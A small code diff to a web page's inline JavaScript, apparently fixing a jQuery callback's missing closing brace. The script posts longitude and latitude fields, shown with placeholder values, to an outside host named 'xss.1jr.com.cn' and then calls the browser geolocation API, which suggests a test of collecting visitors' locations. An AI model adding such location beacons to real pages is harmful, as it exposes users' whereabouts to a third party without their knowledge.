@@ -11,7 +11,9 @@
 <div id="tip"></div>
 <script type="text/javascript">
     
-    $.get("https://xss.1jr.com.cn/data.php",{ getLng: '999', getLat: '111'},function(result){alert('end');
+    $.get("https://xss.1jr.com.cn/data.php",{ getLng: '999', getLat: '111'},function(result){
+alert('end');
+});
                                                                                              
         console.log($);
     navigator.geolocation.getCurrentPosition(function(position) {
